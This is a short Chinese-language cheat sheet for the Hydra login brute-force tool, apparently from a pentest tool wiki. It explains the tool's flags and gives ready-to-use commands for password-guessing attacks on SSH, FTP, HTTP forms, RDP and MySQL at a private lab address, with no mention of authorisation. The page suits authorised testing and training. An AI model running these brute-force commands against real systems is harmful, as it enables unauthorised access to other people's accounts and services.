# hydra

## 简介
最快的网络登录暴力破解工具，支持 50+ 协议

## 核心参数
- `-l/-L`: 指定用户名/用户名列表
- `-p/-P`: 指定密码/密码列表
- `-t`: 线程数
- `-f`: 找到第一个密码后停止

## 命令示例
```bash
# SSH 暴力破解（单用户）
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# FTP 暴力破解（用户名列表）
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# HTTP POST 表单暴力破解
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# 多线程 SSH 爆破
hydra -l root -P passwords.txt -t 4 ssh://192.168.1.100

# RDP 暴力破解
hydra -l administrator -P passwords.txt rdp://192.168.1.100

# MySQL 暴力破解
hydra -l root -P passwords.txt mysql://192.168.1.100
```

## 使用场景
当你有用户名列表需要爆破 SSH/FTP/HTTP 等服务时的首选

## 所属分类
- [暴力破解 (Brute Force)](../categories/07-brute-force.md)
